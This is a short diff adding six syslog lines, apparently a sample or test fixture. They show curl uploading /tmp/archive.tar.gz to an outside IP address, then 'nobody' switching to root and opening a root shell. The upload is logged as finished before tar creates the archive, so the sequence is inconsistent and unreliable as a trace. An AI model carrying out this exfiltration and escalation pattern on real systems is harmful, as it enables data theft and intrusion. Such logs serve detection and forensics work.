@@ -1,0 +1,6 @@
+Jan 29 02:55:41 fedora curl[1899]: POST http://203.0.113.77/upload status=200 size=1048576 bytes
+Jan 29 02:55:42 fedora curl[1899]: upload complete: /tmp/archive.tar.gz
+Jan 29 02:55:43 fedora tar[1898]: created archive /tmp/archive.tar.gz (size: 1.1M)
+Jan 29 02:55:44 fedora su[1902]: Successful su for root by nobody
+Jan 29 02:55:44 fedora su[1902]: + /bin/sh [root]
+Jan 29 02:55:45 fedora cron[1100]: (root) CMD (/usr/local/bin/cleanup.sh)
